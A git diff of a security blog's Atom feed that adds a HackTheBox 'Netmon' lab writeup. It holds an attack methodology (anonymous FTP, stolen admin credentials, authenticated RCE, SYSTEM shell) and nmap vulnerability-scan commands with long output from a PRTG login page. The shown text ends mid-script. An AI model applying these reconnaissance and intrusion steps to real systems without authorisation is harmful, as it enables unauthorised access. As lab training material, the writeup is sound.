@@ -1,4 +1,865 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-08T14:03:38+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">Netmon Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/" rel="alternate" type="text/html" title="Netmon Machine Writeup- HackTheBox" /><published>2020-12-08T05:00:00+05:30</published><updated>2020-12-08T05:00:00+05:30</updated><id>http://localhost:4000/2020/12/08/HTB_Netmon-Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/"></content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Windows" /><category term="Anonymous FTP login" /><category term="PRTG Network" /><summary type="html">A retired windows box from HackTheBox, gained foothold by abusing anonymous FTP login, and then elevated privileges through RCE exploit on PRTG Network Monitor.</summary></entry><entry><title type="html">Jerry Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/" rel="alternate" type="text/html" title="Jerry Machine Writeup- HackTheBox" /><published>2020-12-03T16:00:00+05:30</published><updated>2020-12-03T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/03/HTB_Jerry_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-09T16:12:43+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">b4bygroot</title><subtitle>Ramblings, Facepalms and Writeups from my InfoSec Journey</subtitle><author><name>b4bygroot</name></author><entry><title type="html">Netmon Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/" rel="alternate" type="text/html" title="Netmon Machine Writeup- HackTheBox" /><published>2020-12-08T05:00:00+05:30</published><updated>2020-12-08T05:00:00+05:30</updated><id>http://localhost:4000/2020/12/08/HTB_Netmon-Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/08/HTB_Netmon-Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Netmon/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;Open Ports Enumeration&lt;/li&gt;
+  &lt;li&gt;FTP Service Enumeration&lt;/li&gt;
+  &lt;li&gt;User Flag identified through FTP service&lt;/li&gt;
+  &lt;li&gt;Admin credentials identified from FTP service&lt;/li&gt;
+  &lt;li&gt;Authenticated RCE identified&lt;/li&gt;
+  &lt;li&gt;New SYSTEM user added&lt;/li&gt;
+  &lt;li&gt;SYSTEM shell gained&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;open-ports-enumeration&quot;&gt;Open Ports Enumeration&lt;/h1&gt;
+&lt;p&gt;The open ports enumeration through targetRecon&lt;sup id=&quot;fnref:fn1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;, had identified five open ports namely, &lt;strong&gt;FTP&lt;/strong&gt; (21), &lt;strong&gt;HTTP&lt;/strong&gt; (80),
+&lt;strong&gt;MSRPC&lt;/strong&gt; (135), &lt;strong&gt;NETBIOS-SSN&lt;/strong&gt; (139) and &lt;strong&gt;MICROSOFT-DS&lt;/strong&gt; (445). The scan had not identified any publicly known
+vulnerabilities. The results of the scan are given below.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;arcolinux :: Tracks/Beginner/Netmon » targetRecon 10.10.10.152
+[+] Open Ports Scan
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+		21      ftp
+		80      http
+		135     msrpc
+		139     netbios-ssn
+		445     microsoft-ds
+[+] Scripts Scan
+				 nmap -sV -A --script=default,vuln -p 21 10.10.10.152
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 18:42 IST
+Nmap scan report for 10.10.10.152 (10.10.10.152)
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub
+| 07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
+| 02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
+| 02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files (x86)
+| 02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users
+|_02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_sslv2-drown: 
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
+
+				 nmap -sV -A --script=default,vuln -p 80 10.10.10.152
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 18:43 IST
+Nmap scan report for 10.10.10.152 (10.10.10.152)
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.152
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.10.10.152:80/
+|     Form id: loginform
+|     Form action: /public/checklogin.htm
+|     
+|     Path: http://10.10.10.152:80/public/checklogin.htm
+|     Form id: loginform
+|     Form action: /public/checklogin.htm
+|     
+|     Path: http://10.10.10.152:80/downloads.htm
+|     Form id: loginform
+|     Form action: /public/checklogin.htm
+|     
+|     Path: http://10.10.10.152:80/public/forgotpassword.htm
+|     Form id: loginform
+|     Form action: /public/sendpassword.htm
+|     
+|     Path: http://10.10.10.152:80/home
+|     Form id: loginform
+|_    Form action: /public/checklogin.htm
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-litespeed-sourcecode-download: 
+| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
+| /index.php source code:
+| &amp;lt;!doctype html&amp;gt;\x0D
+| &amp;lt;html class=&quot;&quot;&amp;gt;\x0D
+| &amp;lt;!--\x0D
+|  _  _ _ _ _        _  ____\x0D
+| |___] |_| |__ |__ |__ |      |__ |___/\x0D
+| |       |     | |__ | __| |_ |____ |    \_\x0D
+| \x0D
+| We are hiring software developers! https://www.paessler.com/jobs\x0D
+| \x0D
+| --&amp;gt;\x0D
+| &amp;lt;head&amp;gt;\x0D
+|   &amp;lt;link rel=&quot;manifest&quot; href=&quot;/public/manifest.json.htm&quot;&amp;gt;\x0D
+|   &amp;lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&amp;gt;\x0D
+|   &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;\x0D
+|   &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1&quot;&amp;gt;\x0D
+|   &amp;lt;meta name='viewport' content='width=device-width, height=device-height, initial-scale=0.8'&amp;gt;\x0D
+|   &amp;lt;link id=&quot;prtgfavicon&quot; rel=&quot;shortcut icon&quot; type=&quot;image/ico&quot; href=&quot;/favicon.ico&quot; /&amp;gt;\x0D
+|   &amp;lt;title&amp;gt;Welcome | PRTG Network Monitor (NETMON)&amp;lt;/title&amp;gt;\x0D
+|   &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/css/prtgmini.css?prtgversion=18.1.37.13946__&quot; media=&quot;print,screen,projection&quot; /&amp;gt;\x0D
+| \x0D
+|   \x0D
+|   \x0D
+| \x0D
+|    \x0D
+|    \x0D
+|   \x0D
+|   &amp;lt;script&amp;gt;\x0D(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){\x0D(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\x0Dm=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\x0D})(window,document,'script','//www.google-analytics.com/analytics.js','__ga');\x0D__ga('create', 'UA-154425-18', {\x0D'appId':'-10',\x0D'appName':'PRTG Network Monitor (NETMON)',\x0D'appVersion':'18.1.37.13946'\x0D});\x0D(function(){\x0D  var url =  document.createElement(&quot;a&quot;)\x0D    , urlStripOff = [&quot;mapid&quot;, &quot;tmpid&quot;, &quot;subid&quot;, &quot;topnumber&quot;, &quot;username&quot;, &quot;password&quot;, &quot;email_address&quot;];\x0D  window.gaStripOrigin = function(urlString){\x0D    var param = [];\x0D    url.href = (&quot;&quot;+urlString);\x0D    param = url.search.replace(&quot;?&quot;,&quot;&quot;).split(&quot;&amp;amp;&quot;);\x0D    param = param.filter(function(value){\x0D     return (value !== &quot;&quot; &amp;amp;&amp;amp; urlStripOff.indexOf(value.split(&quot;=&quot;)[0]) === -1)\x0D    });\x0D return url.pathname + (param.length === 0 ? &quot;&quot; : &quot;?&quot; +  param.join(&quot;&amp;amp;&quot;));\x0D};})();\x0Dga(&quot;set&quot;, &quot;location&quot;, &quot;&quot;);\x0Dga(&quot;set&quot;, &quot;hostname&quot;, &quot;trial.paessler.com&quot;);\x0Dga(&quot;set&quot;,&quot;dimension4&quot;,&quot;0&quot;);\x0Dga(&quot;set&quot;,&quot;dimension3&quot;,&quot;18.1.37.13946&quot;.split(&quot;.&quot;).slice(0,3).join(&quot;.&quot;));\x0Dga(&quot;set&quot;,&quot;dimension2&quot;,&quot;774&quot;);\x0D__ga(&quot;set&quot;,&quot;dimension1&quot;,&quot;webgui&quot;);\x0D&amp;lt;/script&amp;gt;\x0D
+| &amp;lt;/head&amp;gt;\x0D
+| &amp;lt;body id=&quot;mainbody&quot; class=&quot;systemmenu loginscreen language_en&quot;&amp;gt;\x0D
+| &amp;lt;!--\x0D
+| //        You can use this file to modify the appearance of the PRTG web interface\x0D
+| //        as described in https://kb.paessler.com/en/topic/33\x0D
+| //        \x0D
+| //        Please note that you are using an unsupported and deprecated feature. \x0D
+| //        Your changes will be broken or removed with future PRTG updates.\x0D
+| //        \x0D
+| //        If you modify this file, PLEASE LET US KNOW what you're changing and why!\x0D
+| //        Just drop an email to support@paessler.com and help us understand your \x0D
+| //        needs. Thank you!       \x0D
+| --&amp;gt;\x0D
+| \x0D
+| \x0D
+| \x0D
+| &amp;lt;div id=&quot;login-container&quot;&amp;gt;\x0D
+| \x0D
+|   &amp;lt;div class=&quot;login-form&quot; style=&quot;&quot;&amp;gt;\x0D
+|     &amp;lt;div class=&quot;login-cell box&quot;&amp;gt;\x0D
+|             &amp;lt;div class=&quot;cell-left cell-login&quot;&amp;gt;\x0D
+|             &amp;lt;h1&amp;gt;PRTG Network Monitor (NETMON)&amp;lt;/h1&amp;gt;\x0D
+|             &amp;lt;noscript&amp;gt;\x0D
+|               &amp;lt;div style=&quot;margin-bottom:10px&quot;&amp;gt;\x0D
+|                 &amp;lt;div class=&quot;nagscreen-box&quot; &amp;gt;\x0D
+|                   &amp;lt;p class=&quot;nagscreen-head&quot;&amp;gt;Javascript is not available!&amp;lt;/p&amp;gt;\x0D
+|                   &amp;lt;p class=&quot;nagscreen-cell&quot;&amp;gt;\x0D
+|                     You cannot use the AJAX Web Interface without Javascript. &amp;lt;br&amp;gt;Javascript seems to be disabled or not supported by your browser.\x0D
+|                   &amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;/div&amp;gt;\x0D
+|               &amp;lt;/div&amp;gt;\x0D
+|             &amp;lt;/noscript&amp;gt;\x0D
+|             &amp;lt;div id=&quot;notofficiallysupported&quot; style=&quot;display:none&quot; class=&quot;nagscreen-box&quot;&amp;gt;\x0D
+|               &amp;lt;p class=&quot;nagscreen-head&quot;&amp;gt;\x0D
+|                 Your browser is not officially supported!\x0D
+|               &amp;lt;/p&amp;gt;\x0D
+|               &amp;lt;p class=&quot;nagscreen-cell&quot;&amp;gt;\x0D
+|                 Some functionalities may not work correctly or not at all. Consider upgrading to a modern browser version. We recommend &amp;lt;a href='https://www.google.com/chrome/'&amp;gt;Chrome&amp;lt;/a&amp;gt; or &amp;lt;a href='http://www.mozilla.org/firefox/'&amp;gt;Firefox&amp;lt;/a&amp;gt;.\x0D
+|               &amp;lt;/p&amp;gt;\x0D
+|             &amp;lt;/div&amp;gt;\x0D
+|             &amp;lt;div id=&quot;unsupportedbrowser&quot; style=&quot;display:none;&quot;&amp;gt;\x0D
+|               &amp;lt;div class=&quot;nagscreen-box&quot; &amp;gt;\x0D
+|                 &amp;lt;p class=&quot;nagscreen-head&quot;&amp;gt;\x0D
+|                  Sorry, your browser is not supported!\x0D
+|                 &amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;p class=&quot;nagscreen-cell&quot;&amp;gt;\x0D
+|                   &amp;lt;b&amp;gt;You might not be able to access all PRTG features with this browser!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;\x0D
+|                   Please upgrade to a modern browser version. We recommend &amp;lt;a href='https://www.google.com/chrome/'&amp;gt;Chrome&amp;lt;/a&amp;gt; or &amp;lt;a href='http://www.mozilla.org/firefox/'&amp;gt;Firefox&amp;lt;/a&amp;gt;.\x0D
+|                 &amp;lt;/p&amp;gt;\x0D
+|               &amp;lt;/div&amp;gt;\x0D
+|             &amp;lt;/div&amp;gt;\x0D
+|             &amp;lt;div id=&quot;dontuselocalhost&quot; style=&quot;display:none;&quot;&amp;gt;\x0D
+|               &amp;lt;div class=&quot;nagscreen-box&quot; &amp;gt;\x0D
+|                 &amp;lt;p class=&quot;nagscreen-head&quot;&amp;gt;\x0D
+|                   Please do not use http://localhost to access the PRTG web server!\x0D
+|                 &amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;p class=&quot;nagscreen-cell&quot;&amp;gt;\x0D
+|                   This may considerably slow down the PRTG web interface on some browsers. Use your IP or DNS name instead.\x0D
+|                 &amp;lt;/p&amp;gt;\x0D
+|               &amp;lt;/div&amp;gt;\x0D
+|             &amp;lt;/div&amp;gt;\x0D
+|             &amp;lt;form id=&quot;loginform&quot; class=&quot;loginform&quot; accept-charset=&quot;UTF-8&quot; action=&quot;/public/checklogin.htm&quot; method=&quot;post&quot; &amp;gt;\x0D
+|                     &amp;lt;input id=&quot;hiddenloginurl&quot; type=&quot;hidden&quot; name=&quot;loginurl&quot; value=&quot;***&quot;&amp;gt;\x0D
+|                 &amp;lt;p class=&quot;login-error&quot;&amp;gt;&amp;lt;div class=&quot;errormessage&quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;div class=&quot;controlgroup&quot;&amp;gt;\x0D
+|                 &amp;lt;label for=&quot;loginusername&quot;&amp;gt;Login&amp;amp;nbsp;Name&amp;lt;/label&amp;gt;\x0D
+|                 &amp;lt;input tabindex=&quot;1&quot; autofocus class=&quot;text&quot; id=&quot;loginusername&quot; name=&quot;username&quot; type=&quot;text&quot; value=&quot;&quot;  /&amp;gt;\x0D
+|                 &amp;lt;/div&amp;gt;\x0D
+| \x0D
+|                 &amp;lt;div class=&quot;controlgroup&quot;&amp;gt;\x0D
+|                 &amp;lt;label for=&quot;loginpassword&quot;&amp;gt;Password&amp;lt;/label&amp;gt;\x0D
+|                 &amp;lt;input tabindex=&quot;1&quot; class=&quot;text&quot; id=&quot;loginpassword&quot; name=&quot;password&quot; type=&quot;password&quot; value=&quot;&quot;  /&amp;gt;\x0D
+|                 &amp;lt;/div&amp;gt;\x0D
+|                 &amp;lt;p class=&quot;buttonbar&quot;&amp;gt;\x0D
+|                       &amp;lt;button class=&quot;loginbutton button big&quot; type=&quot;submit&quot;&amp;gt;Login&amp;lt;/button&amp;gt;\x0D
+|                 &amp;lt;/p&amp;gt;\x0D
+|             &amp;lt;/form&amp;gt;\x0D
+|                 &amp;lt;span class=&quot;downloadclients&quot;&amp;gt;\x0D
+|                     &amp;lt;a class=&quot;nohjax&quot; href=&quot;/downloads.htm&quot;&amp;gt;Download Client Software (optional, for Windows, iOS, Android)&amp;lt;/a&amp;gt;\x0D
+|                 &amp;lt;/span&amp;gt;\x0D
+| \x0D
+|                 &amp;lt;span class=&quot;forgotpw&quot;&amp;gt;\x0D
+|                     &amp;lt;a class=&quot;nohjax&quot; href=&quot;/public/forgotpassword.htm&quot;&amp;gt;Forgot password?&amp;lt;/a&amp;gt;\x0D
+| \x0D
+|                     &amp;lt;a target=&quot;_blank&quot; href=&quot;/help/login.htm#login&quot;&amp;gt;Need Help?&amp;lt;/a&amp;gt;\x0D
+|                 &amp;lt;/span&amp;gt;\x0D
+|             &amp;lt;/div&amp;gt;\x0D
+|           &amp;lt;div class=&quot;cell-left cell-news&quot; style=&quot;&quot;&amp;gt;\x0D
+|             &amp;lt;div class=&quot;logo-box&quot;&amp;gt;\x0D
+|             &amp;lt;img class=&quot;prtg-logo-big&quot; width=&quot;250&quot; height=&quot;150&quot; src=&quot;/images/prtg_logo_gray.png&quot; /&amp;gt;\x0D
+|             &amp;lt;/div&amp;gt;\x0D
+|             \x0D
+|         &amp;lt;/div&amp;gt;\x0D
+|         &amp;lt;div class=&quot;cell-left cell-banner&quot;&amp;gt;\x0D
+|             \x0D
+|             &amp;lt;div&amp;gt;&amp;lt;h2&amp;gt;Thank you for using PRTG Network Monitor&amp;lt;/h2&amp;gt;\x0D
+| \x0D
+|                 &amp;lt;p&amp;gt;You are using the Freeware version of &amp;lt;a href='https://www.paessler.com?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;PRTG Network Monitor&amp;lt;/a&amp;gt;. We're glad to help you cover all aspects of the current state-of-the-art &amp;lt;a href='https://www.paessler.com/network_monitoring?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;network monitoring!&amp;lt;/a&amp;gt;.\x0D
+|                 PRTG Network Monitor enables you to monitor &amp;lt;a href='https://www.paessler.com/uptime_monitoring?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;uptime &amp;lt;/a&amp;gt;,\x0D
+|                 &amp;lt;a href='https://www.paessler.com/bandwidth_monitoring?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;traffic and bandwidth usage&amp;lt;/a&amp;gt; with only one tool. You can also create comprehensive data reports with the integrated reporting and analysis features. This makes PRTG a clear and simple monitoring solution for your entire network.&amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;p&amp;gt;The software runs 24/7 to monitor your network. All you need is a computer with a Windows operating system. PRTG includes everything that you need in one installator, so you can start monitoring your network right away. The Software records bandwidth and network usage and stores the data in an integrated high-performance database.\x0D
+|                 Add all the network devices that you want to monitor via an easy-to-use web-based user interface and configure sensors that retrieve the desired data.\x0D
+|                 You can create usage reports and provide colleagues\x0D
+|                 and customers access to data graphs and tables according a sensible user management.\x0D
+|                 &amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;p&amp;gt; PRTG supports all common protocols to get network data: &amp;lt;a href='https://www.paessler.com/prtg7/infographic/?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;Simple Network Management Protocol (SNMP), Windows Management Instrumentation (WMI)&amp;lt;/a&amp;gt;,\x0D
+|                 &amp;lt;a href='https://www.paessler.com/packet_sniffing?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;Packet Sniffing&amp;lt;/a&amp;gt;,\x0D
+|                 &amp;lt;a href='https://www.paessler.com/netflow_monitoring?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;Cisco NetFlow&amp;lt;/a&amp;gt; and other vendor specific flow protocols, as well as SSH, SOAP, and many other network protocols.&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;\x0D
+|                 PRTG Network Monitor provides about 200 sensor types so you can start monitoring your standard systems directly after installation.\x0D
+|                 These include monitoring Ping times, HTTP pages, SMTP, POP3, and IMAP mail servers, FTP servers, Linux systems, and many other hardware components and network services.\x0D
+|                 You can easily monitor the performance of your network permanently to recognize imminent outages before they occur. In the case of an error, you will receive emails, SMS, or push messages immediately.\x0D
+|                 PRTG constantly records performance data and downtimes in the database so you can compile reports about performance, downtimes, and SLAs at any time.\x0D
+|                 &amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;p&amp;gt;The &amp;lt;a href='https://www.paessler.com/prtg?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;Freeware Edition&amp;lt;/a&amp;gt; of PRTG Network Monitor is completely free for personal and commercial use.\x0D
+|                 If you want to complete your monitoring or have larger networks, use one of our &amp;lt;a href='https://www.paessler.com/order?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;Commercial Editions&amp;lt;/a&amp;gt; that provide you with a suitable license.&amp;lt;/p&amp;gt;\x0D
+|                 &amp;lt;p&amp;gt;&amp;lt;b&amp;gt;More about &amp;lt;a href='https://www.paessler.com/prtg?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;PRTG Network Monitor&amp;lt;/a&amp;gt; and &amp;lt;a href='https://www.paessler.com?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-freeware'&amp;gt;Paessler - The Network Monitoring Company&amp;lt;/a&amp;gt;.&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;\x0D
+|             &amp;lt;/div&amp;gt;\x0D
+|     &amp;lt;/div&amp;gt;\x0D
+|   &amp;lt;/div&amp;gt;\x0D
+| \x0D
+|   &amp;lt;div class=&quot;footer&quot;&amp;gt;\x0D
+|         &amp;lt;span class=&quot;paesslerlogo&quot;&amp;gt;\x0D
+|       &amp;lt;a href=&quot;https://www.paessler.com?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-homepage&quot; target=&quot;_blank&quot; title=&quot;Paessler AG - The Network Monitoring Company&quot;&amp;gt;&amp;lt;img border=0 id=&quot;paesslerlogo&quot; src=&quot;/images/paessler.png&quot;&amp;gt;&amp;lt;/a&amp;gt;\x0D
+|     &amp;lt;/span&amp;gt;\x0D
+|     &amp;lt;span class=&quot;prtgversion&quot;&amp;gt;&amp;amp;nbsp;PRTG Network Monitor 18.1.37.13946 &amp;lt;/span&amp;gt;\x0D
+|     &amp;lt;span class=&quot;copyright&quot;&amp;gt;&amp;amp;copy; 2018 &amp;lt;a href=&quot;https://www.paessler.com?utm_source=prtg&amp;amp;utm_medium=referral&amp;amp;utm_campaign=webgui-homepage&quot; target=&quot;_blank&quot; title=&quot;The Network Monitoring Company&quot;&amp;gt;Paessler AG&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt;\x0D
+|   &amp;lt;/div&amp;gt;\x0D
+| &amp;lt;/div&amp;gt;\x0D
+| &amp;lt;script&amp;gt;\x0D
+|   var actualBrowserInclude = {\x0D
+|     &quot;current&quot;: {\x0D
+|         &quot;desktop&quot;: {\x0D
+|             &quot;c&quot;: 58.0,\x0D
+|             &quot;f&quot;: 53.0,\x0D
+|             &quot;i&quot;: 12.0,\x0D
+|             &quot;o&quot;: 44.0,\x0D
+|             &quot;pale moon&quot;: 27.0,\x0D
+|             &quot;s&quot;: 10.0,\x0D
+|             &quot;vivaldi&quot;: 1.10,\x0D
+|             &quot;yandex&quot;: 17.04,\x0D
+|             &quot;ios&quot;:10.3,\x0D
+|             &quot;e&quot;:14.0,\x0D
+|             &quot;i&quot;:14.0,\x0D
+|             &quot;iOS&quot;: 10.3,\x0D
+|             &quot;a&quot;: 700,\x0D
+|             &quot;uc&quot;: 11.03\x0D
+|         },\x0D
+|         &quot;mobile&quot;: {\x0D
+|             &quot;android&quot;: 0,\x0D
+|             &quot;c&quot;: 55,\x0D
+|             &quot;f&quot;: 50.0,\x0D
+|             &quot;o&quot;: 37.0\x0D
+|         }\x0D
+|     }\x0D
+| }\x0D
+| // prebuild action on bmx\x0D
+| // this file should be downloaded and updated from\x0D
+| // https://github.com/browser-update/browser-update/browser.json\x0D
+| \x0D
+| ;\x0D
+|   (function(window, document, undefined){\x0D
+| //(c)2017, MIT Style License &amp;lt;browser-update.org/LICENSE.txt&amp;gt;\x0D
+| //https://github.com/browser-update/browser-update/blob/master/update.js\x0D
+| //unmodified\x0D
+| if (window.nocheck) {\x0D
+|     return\x0D
+| }\x0D
+| function $bu_getBrowser(ua_str) {\x0D
+|     var n,t,ua=ua_str||navigator.userAgent,donotnotify=false;\x0D
+|     var names={i:'Internet Explorer',e:&quot;Edge&quot;,f:'Firefox',o:'Opera',s:'Safari',n:'Netscape',c:&quot;Chrome&quot;,a:&quot;Android Browser&quot;, y:&quot;Yandex Browser&quot;,v:&quot;Vivaldi&quot;,uc:&quot;UC Browser&quot;,x:&quot;Other&quot;};\x0D
+|     function ignore(reason,pattern){if (RegExp(pattern,&quot;i&quot;).test(ua)) return reason;}\x0D
+|     var ig=ignore(&quot;bot&quot;,&quot;bot|spider|archiver|transcoder|crawl|checker|monitoring|screenshot|python-|php|uptime|validator|fetcher|facebook|slurp|google|yahoo|microsoft|node|mail.ru|github|cloudflare|addthis|thumb|proxy|feed|fetch|favicon|link|http|scrape|seo|page|search console|AOLBuild|Teoma|Gecko Expeditor&quot;)||\x0D
+|         ignore(&quot;discontinued browser&quot;,&quot;camino|flot|k-meleon|fennec|galeon|chromeframe|coolnovo&quot;) ||\x0D
+|         ignore(&quot;complicated device browser&quot;,&quot;SMART-TV|SmartTV&quot;) ||\x0D
+|         ignore(&quot;niche browser&quot;,&quot;Dorado|Whale|SamsungBrowser|MIDP|wii|Chromium|Puffin|Opera Mini|maxthon|maxton|dolfin|dolphin|seamonkey|opera mini|netfront|moblin|maemo|arora|kazehakase|epiphany|konqueror|rekonq|symbian|webos|PaleMoon|QupZilla|Otter|Midori|qutebrowser&quot;) ||\x0D
+|         ignore(&quot;mobile without upgrade path or landing page&quot;,&quot;kindle|silk|blackberry|bb10|RIM|PlayBook|meego|nokia|ucweb|ZuneWP7|537.85.10&quot;) ||\x0D
+|         ignore(&quot;android(chrome) web view&quot;,&quot;; wv&quot;);\x0D
+|     var mobile=(/iphone|ipod|ipad|android|mobile|phone|ios|iemobile/i.test(ua));\x0D
+|     if (ig)\x0D
+|         return {n:&quot;x&quot;,v:0,t:&quot;other browser&quot;,donotnotify:ig};\x0D
+| \x0D
+|     var pats=[\x0D
+|         [&quot;CriOS.VV&quot;,&quot;c&quot;],\x0D
+|         [&quot;FxiOS.VV&quot;,&quot;f&quot;],\x0D
+|         [&quot;Trident.*rv:VV&quot;,&quot;i&quot;],\x0D
+|         [&quot;Trident.VV&quot;,&quot;io&quot;],\x0D
+|         [&quot;UCBrowser.VV&quot;,&quot;uc&quot;],\x0D
+|         [&quot;MSIE.VV&quot;,&quot;i&quot;],\x0D
+|         [&quot;Edge.VV&quot;,&quot;e&quot;],\x0D
+|         [&quot;Vivaldi.VV&quot;,&quot;v&quot;],\x0D
+|         [&quot;OPR.VV&quot;,&quot;o&quot;],\x0D
+|         [&quot;YaBrowser.VV&quot;,&quot;y&quot;],\x0D
+|         [&quot;Chrome.VV&quot;,&quot;c&quot;],\x0D
+|         [&quot;Firefox.VV&quot;,&quot;f&quot;],\x0D
+|         [&quot;Version.VV.*Safari&quot;,&quot;s&quot;],\x0D
+|         [&quot;Safari.VV&quot;,&quot;so&quot;],\x0D
+|         [&quot;Opera.*Version.VV&quot;,&quot;o&quot;],\x0D
+|         [&quot;Opera.VV&quot;,&quot;o&quot;],\x0D
+|         [&quot;Netscape.VV&quot;,&quot;n&quot;]\x0D
+|     ];\x0D
+|     for (var i=0; i &amp;lt;pats.length; i++) {\x0D
+|         if (ua.match(new RegExp(pats[i][0].replace(&quot;VV&quot;,&quot;(\\d+\\.?\\d+)&quot;),&quot;i&quot;))) {\x0D
+|             n=pats[i][1];\x0D
+|             break;\x0D
+|         }\x0D
+|     }\x0D
+|     var semver=n===&quot;v&quot;||n===&quot;y&quot;||n===&quot;uc&quot;;\x0D
+|     if (semver) {//zero pad semver for easy comparing\x0D
+|         var parts = (RegExp.$1).split('.');\x0D
+|         var v=(parts[0] + &quot;.&quot; + (&quot;00&quot;.substring(0, 2 - parts[1].length) + parts[1]));\x0D
+|     }\x0D
+|     else {\x0D
